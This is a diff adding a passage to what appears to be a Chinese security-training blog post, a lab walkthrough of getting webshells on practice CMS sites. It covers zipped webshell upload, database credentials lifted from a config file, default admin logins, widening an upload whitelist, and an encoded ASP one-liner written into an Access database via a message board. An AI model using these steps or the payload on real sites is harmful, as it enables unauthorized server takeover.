+<p>我们这里尝试把一句话压缩为zip格式上传</p>
+<p><img src="/2021/12/04/day35/image-20211206145837611.png" alt="image-20211206145837611"></p>
+<p>发现可以上传</p>
+<p>安装后我们在Templates/1 中找到了我们上传的模板</p>
+<p><img src="/2021/12/04/day35/image-20211206150020825.png" alt="image-20211206150020825"></p>
+<p>路径</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi9.com/Templates/1/1.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206150217309.png" alt="image-20211206150217309"></p>
+<p>到这里我们发现一个事，既然zip上传可行，我们刚才的文件上传是不是也可以上传zip格式</p>
+<p><img src="/2021/12/04/day35/image-20211206151647010.png" alt="image-20211206151647010"></p>
+<p>尝试之后发现上传上去了，我们把它解压即可getshell，就不演示了</p>
+<h4 id="利用配置文件中的数据库连接信息getshell"><a href="#利用配置文件中的数据库连接信息getshell" class="headerlink" title="利用配置文件中的数据库连接信息getshell"></a>利用配置文件中的数据库连接信息getshell</h4><p>我们在文件管理中发现了后缀为config的配置文件</p>
+<p><img src="/2021/12/04/day35/image-20211206152126179.png" alt="image-20211206152126179"></p>
+<p>查看后我们发现了数据库的连接信息</p>
+<p><img src="/2021/12/04/day35/image-20211206152209725.png" alt="image-20211206152209725"></p>
+<p>我们用数据库客户端连接它</p>
+<p>user id为SA应该是个SQL server数据库</p>
+<p><img src="/2021/12/04/day35/image-20211206152644413.png" alt="image-20211206152644413"></p>
+<p><img src="/2021/12/04/day35/image-20211206152735065.png" alt="image-20211206152735065"></p>
+<p>成功getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206152803532.png" alt="image-20211206152803532"></p>
+<h3 id="无忧企业系统-getshell"><a href="#无忧企业系统-getshell" class="headerlink" title="无忧企业系统 getshell"></a>无忧企业系统 getshell</h3><p>还是先找后台管理进入</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi18.com/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206162717194.png" alt="image-20211206162717194"></p>
+<p>admin 123456进入</p>
+<p><img src="/2021/12/04/day35/image-20211206162737260.png" alt="image-20211206162737260"></p>
+<h4 id="上传文件getshell"><a href="#上传文件getshell" class="headerlink" title="上传文件getshell"></a>上传文件getshell</h4><p>进入后台后我们发现上传点</p>
+<p><img src="/2021/12/04/day35/image-20211206163843622.png" alt="image-20211206163843622"></p>
+<p>但是发现asp、php等的后缀无法上传</p>
+<p><img src="/2021/12/04/day35/image-20211206163912432.png" alt="image-20211206163912432"></p>
+<p>看到只允许xxx的，显然做了一个白名单，而且我们在网站设置处发现了这个白名单设置</p>
+<p><img src="/2021/12/04/day35/image-20211206164017460.png" alt="image-20211206164017460"></p>
+<p>那我们只需要把我们想要上传的后缀加上去上传即可，就不演示了</p>
+<h4 id="留言一句话到数据库getshell"><a href="#留言一句话到数据库getshell" class="headerlink" title="留言一句话到数据库getshell"></a>留言一句话到数据库getshell</h4><p>如果access数据库是asp格式，我们可以插入一句话到数据库，访问数据库即可getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206164209421.png" alt="image-20211206164209421"></p>
+<p>我们通过留言来写入一句话</p>
+<p><img src="/2021/12/04/day35/image-20211206164515043.png" alt="image-20211206164515043"></p>
+<p>在网站前台留言，然后再后台回复一句话</p>
+<pre class="line-numbers language-none"><code class="language-none">┼攠數畣整爠煥敵瑳∨≡┩愾 密码a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206164636158.png" alt="image-20211206164636158"></p>
+<p>这样我们的一句话就插入到数据库里</p>
+<p>我们可以直接通过数据库路径访问</p>
+<p><img src="/2021/12/04/day35/image-20211206164803721.png" alt="image-20211206164803721"></p>
+<p>asp文件名字需要url编码</p>
+<p><img src="/2021/12/04/day35/image-20211206164836249.png" alt="image-20211206164836249"></p>
+<p>500错误证明我们的一句话写入了</p>
+<pre class="line-numbers language-none"><code class="language-none">http://www.cbi18.com/Databases/%25%23%40%24%40%23%46%44%53%40%23%24%25%25%23.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206164910522.png" alt="image-20211206164910522"></p>
+<p>我们也可以将数据库备份为asp文件，然后通过备份的路径访问webshell</p>
+<p><img src="/2021/12/04/day35/image-20211206165007766.png" alt="image-20211206165007766"></p>
 
                 
             </div>
@@ -1273,7 +1550,7 @@ http://www.cbi2.com/plus/ad_js.php?aid=5<span aria-hidden="true" class="line-num
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">160.1k</span>
+                        class="white-color">162.2k</span>
             
             
             
